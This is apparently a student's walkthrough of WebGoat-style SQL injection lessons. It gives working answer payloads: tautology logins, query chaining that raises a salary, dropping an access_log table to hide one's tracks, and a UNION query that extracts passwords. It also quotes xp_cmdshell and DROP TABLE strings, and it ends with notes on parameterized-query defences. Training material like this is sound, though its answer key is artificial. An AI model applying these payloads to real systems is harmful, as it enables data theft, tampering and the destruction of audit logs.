
# SQL Injection (Intro)

### 1

The lesson describes what SQL is and how it can be manipulated to perform tasks that were not originally intended during development.

 **Goals:**

- The user will have a basic understanding of how SQL works and what it is used for
- The user will have a basic understanding of what SQL injection is and how it works
- The user will demonstrate knowledge on:
    - DML, DDL and DCL
    - String SQL injection
    - Numeric SQL injection
    - How SQL injection violates the CIA triad

### 2 **What is SQL?**

SQL (Structured Query Language) is the standard programming language used to manage, query, and manipulate data within relational databases. It allows users to efficiently retrieve specific information, update records, and structure how data is stored through a system of tables.

There are three main categories of SQL commands:

- Data Manipulation Language (DML)
- Data Definition Language (DDL)
- Data Control Language (DCL)



---

Q: Look at the example table. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.

|**User ID**|**First Name**|**Last Name**|**Department**|**Salary**|**Auth Tan**|
|---|---|---|---|---|---|
|32147|Paulina|Travers|Accounting|$46,000|P45JSI|
|89762|Tobi|Barnett|Development|$77,000|TA9LL1|
|96134|Bob|Franco|Marketing|$83,700|LO9S2V|
|34477|Abraham|Holman|Development|$50,000|UU2ALK|
|37648|John|Smith|Marketing|$64,350|3SL99A|
A: SELECT * FROM EMPLOYEES WHERE USERID=96134

SS1

### 3 Data Manipulation Language (DML)

**DML** is the subset of SQL used to manage data within existing schema objects. While these commands are essential for app functionality, they are the primary targets for SQLi

When an attacker injects DML, they can bypass authorization to compromise the **CIA Triad**:

|Command|Purpose|Security Risk (The "So What?")|
|---|---|---|
|**`SELECT`**|Retrieves data|**Confidentiality:** Leaking sensitive user data or credentials.|
|**`INSERT`**|Adds new data|**Integrity:** Creating unauthorized admin accounts or fake records.|
|**`UPDATE`**|Modifies data|**Integrity/Availability:** Changing passwords or corrupting system settings.|
|**`DELETE`**|Removes data|**Availability:** Nuking tables or specific user records to disrupt service.|
EX:

SELECT phone 
FROM employees 
WHERE userid = 96134;

---

Q: Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.

A: UPDATE EMPLOYEES SET department='Sales' WHERE USERID=89762

SS2

### 4 Data Definition Language (DDL)

**DDL** consists of SQL commands that define or modify the database **schema**—the structural blueprint of the database (tables, indexes, and views). While DML targets individual records, DDL targets the database architecture itself.

Injection of DDL is high-stakes; it often results in total system failure or permanent data loss.

|Command|Purpose|Security Risk|
|---|---|---|
|**`CREATE`**|Builds new objects|**Integrity:** Injecting malicious triggers or "shadow" tables to capture data.|
|**`ALTER`**|Modifies existing structures|**Integrity:** Disabling constraints (like unique keys) or adding columns to leak data.|
|**`DROP`**|Deletes objects|**Availability:** Deleting entire tables, instantly crashing the application.|
The following command defines the structure of the `employees` table:

SQL

```
CREATE TABLE employees (
    userid varchar(6) NOT NULL PRIMARY KEY,
    first_name varchar(20),
    last_name varchar(20),
    department varchar(20),
    salary varchar(10),
    auth_tan varchar(6)
);
```

If an application allows DDL injection, an attacker could append `; DROP TABLE employees;` to a legitimate query. Unlike deleting a row (DML), this destroys the table structure entirely, causing any subsequent attempts to access employee data to fail.

---

Q: Now try to modify the schema by adding the column "phone" (varchar(20)) to the table "employees". :

A: ALTER TABLE EMPLOYEES ADD phone varchar(20)

SS3

### 5 Data Control Language (DCL)

**DCL** is used to manage security and access control within the database. It defines the permissions (privileges) that users or roles have over database objects.

In the context of an injection attack, DCL is used for Privilege Escalation.

|Command|Purpose|Security Risk|
|---|---|---|
|**`GRANT`**|Provides access privileges|**Confidentiality/Integrity:** An attacker can grant themselves `DBA` (admin) rights to access any data.|
|**`REVOKE`**|Removes access privileges|**Availability:** An attacker can lock out legitimate admins or the application itself from the database.|
A standard administrative command might look like this:

SQL

```
GRANT CREATE TABLE TO operator;
```

If an attacker successfully injects DCL, they can bypass the application's logic entirely. For example, by injecting `; GRANT ALL PRIVILEGES TO 'attacker_user';`, they move from a limited web user to a database superuser. This allows them to bypass every other security control in place.

---

Q: Try to grant rights to the table `grant_rights` to user `unauthorized_user`:

A: GRANT SELECT ON grant_right to unauthorized_user

SS4

### 6 Examples

SQL Injection occurs when user-supplied data is concatenated directly into a database query string instead of being treated as a literal value.


In this scenario, the application builds a query by "plugging in" the `userName` variable directly:

SQL

```
"SELECT * FROM users WHERE name = '" + userName + "'";
```

The behavior of the query changes based entirely on the **delimiters** (like `'`) and **operators** (like `OR` or `;`) provided by the user.

|User Input|Resulting SQL Query|Impact|
|---|---|---|
|`Smith`|`SELECT * FROM users WHERE name = 'Smith';`|**Standard:** Returns one record.|
|`Smith' OR '1'='1`|`SELECT * FROM users WHERE name = 'Smith' OR '1'='1';`|**Bypass:** `1=1` is always true; returns **all** users in the table.|
|`Smith'; DROP TABLE users;--`|`SELECT * FROM users WHERE name = 'Smith'; DROP TABLE users;--';`|**Destructive:** Ends the first query and executes a DDL command to delete the table.|


1. **Tautology (`OR '1'='1`):** Forces the query to return `TRUE` for every row, bypassing authentication or data filters.
2. **Comment Out (`--` or `#`):** Used to "mute" the rest of the original query (like a closing quote or parenthesis) so the injected code doesn't cause a syntax error.
3. **Stacked Queries (`;`):** Allows the attacker to run entirely new commands (DML or DDL) after the initial legitimate one.

SS5

### 7 Consequences of SQLi

A successful SQL injection exploit can:

- Read and modify sensitive data from the database
- Execute administrative operations on the database
    - Shutdown auditing or the DBMS
    - Truncate tables and logs
    - Add users
    
- Recover the content of a given file present on the DBMS file system
- Issue commands to the operating system

SQL injection attacks allow attackers to

- Spoof identity
- Tamper with existing data
- Cause repudiation issues such as voiding transactions or changing balances
- Allow the complete disclosure of all data on the system
- Destroy the data or make it otherwise unavailable
- Become administrator of the database server

### 8 Severity of SQLi

 The severity of SQL injection attacks is limited by

- Attacker’s skill and imagination
- Defense in depth countermeasures
    - Input validation
    - Least privilege
- Database technology

 Not all databases support command chaining

- Microsoft Access
- MySQL Connector/J and C
- Oracle

SQL injection is more common in PHP, Classic ASP, Cold Fusion and older languages

- Languages that do not provide parameterized query support
- Parameterized queries have been added to newer versions
- Early adopters of web technology (i.e. Old Code)

Not all databases are equal (SQL Server)

- Command shell: `master.dbo.xp_cmdshell 'cmd.exe dir c:'`
- Registry commands: `xp_regread`, `xp_regdeletekey`, …

### 9 String SQLi

Q: The query in the code builds a dynamic query as seen in the previous example. The query is built by concatenating strings making it susceptible to String SQL injection:

```SQL
"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";
```

Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.


A:
SS6

### 10 Numeric SQLi

Q: The query in the code builds a dynamic query as seen in the previous example. The query in the code builds a dynamic query by concatenating a number making it susceptible to Numeric SQL injection:

```SQL
"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
```

Using the two Input Fields below, try to retrieve all the data from the users table.

Warning: Only one of these fields is susceptible to SQL Injection. You need to find out which, to successfully retrieve all the data.

A:

Login_Count: 0
User_Id: 0 or 1=1

SS7

### 11 Compromising Confidentiality with String SQLi

If a system is vulnerable to SQL injections, aspects of that system’s CIA triad can be easily compromised _(if you are unfamiliar with the CIA triad, check out the CIA triad lesson in the general category)_. In the following three lessons you will learn how to compromise each aspect of the CIA triad using techniques like _SQL string injections_ or _query chaining_.

In this lesson we will look at **confidentiality**. Confidentiality can be easily compromised by an attacker using SQL injection; for example, successful SQL injection can allow the attacker to read sensitive data like credit card numbers from a database.

What is String SQLi?

if an application builds SQL queries simply by concatenating user supplied strings to the query, the application is likely very susceptible to String SQL injection.  
More specifically, if a user supplied string simply gets concatenated to a SQL query without any sanitization or preparation, then you may be able to modify the query’s behavior by simply inserting quotation marks into an input field. For example, you could end the string parameter with quotation marks and input your own SQL after that.


---

Q: 
You are an employee named John **Smith** working for a big company. The company has an internal system that allows all employees to see their own internal data such as the department they work in and their salary.

The system requires the employees to use a unique _authentication TAN_ to view their data.  
Your current TAN is **3SL99A**.

Since you always have the urge to be the most highly paid employee, you want to exploit the system so that instead of viewing your own internal data, _you want to take a look at the data of all your colleagues_ to check their current salaries.

Use the form below and try to retrieve all employee data from the **employees** table. You should not need to know any specific names or TANs to get the information you need.  
You already found out that the query performing your request looks like this:

```SQL
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
```

A: 

Employee Name: ' or 1=1 --

Authentication TAN: 3SL99A

SS8

### 12 Compromising Integrity with Query Chaining

Query chaining is exactly what it sounds like. With query chaining, you try to append one or more queries to the end of the actual query. You can do this by using the **;** metacharacter. A **;** marks the end of a SQL statement; it allows one to start another query right after the initial query without the need to even start a new line.

Q: You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.  
Better go and _change your own salary so you are earning the most!_

Remember: Your name is John **Smith** and your current TAN is **3SL99A**.

A: 

Employee Name: `Smith' ; UPDATE employees SET salary = 999999 WHERE first_name = 'John`

Authentication TAN:  **3SL99A**

SS9

### 13 Compromising Availability

There are many different ways to violate availability. If an account is deleted or its password gets changed, the actual owner cannot access this account anymore. Attackers could also try to delete parts of the database, or even drop the whole database, in order to make the data inaccessible. Revoking the access rights of admins or other users is yet another way to compromise availability; this would prevent these users from accessing either specific parts of the database or even the entire database as a whdle.

Q: Now you are the top earner in your company. But do you see that? There seems to be a **access_log** table, where all your actions have been logged to!  
Better go and _delete it_ completely before anyone notices.

A: 

Action Contains: %';drop table access_log-- 

SS10


---

# SQL Injection (Advanced)

### 1

The advanced section describes the more advanced topics for an SQL injection.

 **Goals**

- Combining SQL injection Techniques
- Blind SQL injection

### 2 

**Special Characters:**

```
/* */          are inline comments
-- , #          are line comments

Example: SELECT * FROM users WHERE name = 'admin' -- AND pass = 'pass'
```

```
;        allows query chaining

Example: SELECT * FROM users; DROP TABLE users;
```

```
',+,||         allows string concatenation
Char()         strings without quotes

Example: SELECT * FROM users WHERE name = '+char(27) OR 1=1
```

**Special Statements:**

**Union**

The Union operator is used, to combine the results of two or more SELECT Statements.

Rules to keep in mind, when working with a UNION:

- The number of columns selected in each statement must be the same.
- The datatype of the first column in the first SELECT statement, must match the datatype of the first column in the second (third, fourth, …​) SELECT Statement. The Same applies to all other columns.

```
SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;
```

The UNION ALL Syntax also allows duplicate Values.

**Joins**

The Join operator is used to combine rows from two or more tables, based on a related column

```
SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;
```

Learn More Here: https://www.w3schools.com/sql/sql_join.asp

### 3 Pulling Data From Other Tables


Q: 
The input field below is used to get data from a user by their last name.  
The table is called 'user_data':

``` text
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
```

Through experimentation you found that this field is susceptible to SQL injection. Now you want to use that knowledge to get the contents of another table.  
The table you want to pull data from is:

```text
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

**6.a)** Retrieve all data from the table  
**6.b)** When you have figured it out…​. What is Dave’s password?

Note: There are multiple ways to solve this Assignment. One is by using a UNION, the other by appending a new SQl statement. Maybe you can find both of them.

A:

Name:  ' UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data --

Password: copy and paste daves password from the password field - passW0rD


SS11

### 4 Blind SQLi

Blind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the application’s response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.

 Difference

Let us first start with the difference between a normal SQL injection and a blind SQL injection. In a normal SQL injection the error messages from the database are displayed and gives enough information to find out how the query is working. Or in the case of a UNION based SQL injection the application does not reflect the information directly on the web page. So in the case where nothing is displayed you will need to start asking the database questions based on a true or false statement. That is why a blind SQL injection is much more difficult to exploit.

There are several different types of blind SQL injections: content-based and time-based SQL injections.

 Example

In this case we are trying to ask the database a boolean question based on a unique id, for example suppose we have the following url: `[https://my-shop.com?article=4](https://my-shop.com?article=4)` On the server side this query will be translated as follows:

SELECT * FROM articles WHERE article_id = 4

When we want to exploit this we change the url into: `[https://shop.example.com?article=4](https://shop.example.com?article=4) AND 1=1` This will be translated to:

SELECT * FROM articles WHERE article_id = 4 and 1 = 1

If the browser will return the same page as it used to when using `[https://shop.example.com?article=4](https://shop.example.com?article=4)` you know the website is vulnerable for a blind SQL injection. If the browser responds with a page not found or something else you know a blind SQL injection might not work. You can now change the SQL query and test for example: `[https://shop.example.com?article=4](https://shop.example.com?article=4) AND 1=2` which will not return anything because the query returns false.

How do we actually take advantage of this? Above we only asked the database a trivial question but you can for example also use the following url: `[https://shop.example.com?article=4](https://shop.example.com?article=4) AND substring(database_version(),1,1) = 2`

Most of the time you start by finding which type of database is used, based on the type of database you can find the system tables of the database you can enumerate all the tables present in the database. With this information you can start getting information from all the tables and you are able to dump the database. Be aware that this approach might not work if the privileges of the database are setup correctly (meaning the system tables cannot be queried with the user used to connect from the web application to the database).

Another way is called a time-based SQL injection, in this case you will ask the database to wait before returning the result. You might need to use this if you are totally blind. This means there is no difference between the response data. To achieve this kind of SQL injection you could use:

article = 4; sleep(10) --

### 5 Tom

Q: We now explained the basic steps involved in an SQL injection. In this assignment you will need to combine all the things we explained in the SQL lessons.

Goal: Can you login as Tom?

Have fun!

A: 

Username: tom

Password: thisisasecretfortomonly


SS12

### 6 Quiz

1. What is the difference between a prepared statement and a statement?

Solution 1: Prepared statements are statements with hard-coded parameters.  
Solution 2: Prepared statements are not stored in the database.  
Solution 3: A statement is faster.  
<u>Solution 4: A statement has got values instead of a prepared statement  </u>

2. Which one of the following characters is a placeholder for variables?

Solution 1: *  
Solution 2: =  
<u>Solution 3: ?  </u>
Solution 4: !  

3. How can prepared statements be faster than statements?

Solution 1: They are not static so they can compile better written code than statements.  
<u>Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.  </u>
Solution 3: Prepared statements are stored and wait for input it raises performance considerably.  
Solution 4: Oracle optimized prepared statements. Because of the minimal use of the databases resources it is faster.  

4. How can a prepared statement prevent SQL-Injection?

Solution 1: Prepared statements have got an inner check to distinguish between input and logical errors.  
Solution 2: Prepared statements use the placeholders to make rules what input is allowed to use.  
<u>Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.  </u>
Solution 4: Prepared statements always read inputs literally and never mixes it with its SQL commands.  

5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?

Solution 1: The table Students and all of its content will be deleted.  
Solution 2: The input deletes all students with the name Robert.  
Solution 3: The database registers 'Robert' and deletes the table afterwards.  
<u>Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.</u>

SS13

# SQL Injection (Mitigation)

### 1 

**Immutable Queries - Best SQL Injection Defense**

Treat data as single entities bound to columns without interpretation.

**Types:**

1. **Static Queries** - No user data
    - `SELECT * FROM products;`
2. **Parameterized Queries** - Use placeholders (?)
    - `String query = "SELECT * FROM users WHERE last_name = ?";`
    - `PreparedStatement statement = connection.prepareStatement(query);`
    - `statement.setString(1, accountName);`
3. **Stored Procedures** - Only safe if they don't generate dynamic SQL

**Avoid:** String concatenation with user input

- BAD: `"SELECT * FROM users WHERE user = '" + userInput + "'";`

### 2

**Stored Procedures**

**Safe Stored Procedure** (uses parameters directly)

- `CREATE PROCEDURE ListCustomers(@Country nvarchar(30))`
- `SELECT city, COUNT(*) FROM customers WHERE country LIKE @Country GROUP BY city`
- `EXEC ListCustomers 'USA'`

**Injectable Stored Procedure** (builds dynamic SQL string)

- `CREATE PROCEDURE getUser(@lastName nvarchar(25))`
- `declare @sql nvarchar(255)`
- `set @sql = 'SELECT * FROM users WHERE lastname = ' + @LastName + ''`
- `exec sp_executesql @sql`
- **VULNERABLE** - concatenates user input into SQL string

**Key:** Safe stored procedures use parameters directly in queries. Unsafe ones build dynamic SQL strings with concatenation.

### 3

**Parameterized Queries - Java Example**

**Input Validation**

- `RegEx r = new Regex("^[A-Za-z0-9]{16}$");`
- Validates username is alphanumeric, exactly 16 chars

**Safe Query Implementation**

- `pUsername = request.getParameter("UserName");`
- `if (isUsernameValid(pUsername))` - validate first
- `ps = conn.prepareStatement("SELECT * FROM user_table WHERE username = ?");`
- `ps.setString(1, pUsername);` - bind parameter
- `rs = ps.execute();`

**Defense Layers:**

1. Input validation (regex check)
2. Parameterized query (no concatenation)
3. Exception handling

### 4

**Parameterized Queries - Java Example (Full Implementation)**

**Input Handling**

- `String accountID = getParser().getStringParameter(ACCT_ID, "");`
- Parser validates/sanitizes input

**Prepared Statement**

- `String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";`
- `PreparedStatement statement = connection.prepareStatement(query);`
- `statement.setString(1, accountID);` - bind parameter
- `ResultSet results = statement.executeQuery();`

**Result Validation**

- `results.last();` - move to last record
- `if (results.getRow() <= 2)` - verify max 2 rows returned
- Detects database integrity issues (should only return 1 record)

**Error Handling**

- Try-with-resources for auto-closing connections
- Handles no records found
- Handles multiple records (integrity issue)
- Catches SQL exceptions

**Best Practices:** Input validation + parameterized queries + result validation + proper exception handling

### 5



